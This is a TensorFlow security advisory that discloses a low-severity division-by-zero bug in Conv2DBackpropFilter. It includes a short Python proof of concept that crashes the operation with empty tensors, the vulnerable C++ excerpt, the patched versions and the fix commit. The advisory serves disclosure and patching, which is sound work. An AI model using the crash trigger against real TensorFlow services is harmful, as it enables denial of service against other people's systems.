# Division by zero in `Conv2DBackpropFilter`

Low

[mihaimaruseac](/mihaimaruseac)
published
GHSA-j8qc-5fqr-52fp
May 13, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.5.0

## Patched versions

2.1.4, 2.2.3, 2.3.3, 2.4.2

## Description

### Impact

An attacker can cause a division by zero to occur in `Conv2DBackpropFilter`:

```
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
filter_sizes = tf.constant([0, 0, 0, 0], shape=[4], dtype=tf.int32)
out_backprop = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)

tf.raw_ops.Conv2DBackpropFilter(
  input=input_tensor,
  filter_sizes=filter_sizes,
  out_backprop=out_backprop,
  strides=[1, 1, 1, 1],
  use_cudnn_on_gpu=False,
  padding='SAME',
  explicit_paddings=[],
  data_format='NHWC',
  dilations=[1, 1, 1, 1]
)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da/tensorflow/core/kernels/conv_grad_filter_ops.cc#L513-L522) computes a divisor based on user provided data (i.e., the shape of the tensors given as arguments):

```
const size_t size_A = output_image_size * filter_total_size;
const size_t size_B = output_image_size * dims.out_depth;
const size_t size_C = filter_total_size * dims.out_depth;
const size_t work_unit_size = size_A + size_B + size_C;
const size_t shard_size = (target_working_set_size + work_unit_size - 1) / work_unit_size;
```

If all shapes are empty then `work_unit_size` is 0. Since there is no check for this case before division, this results in a runtime exception, with potential to be abused for a denial of service.

### Patches

We have patched the issue in GitHub commit [c570e2ecfc822941335ad48f6e10df4e21f11c96](https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.
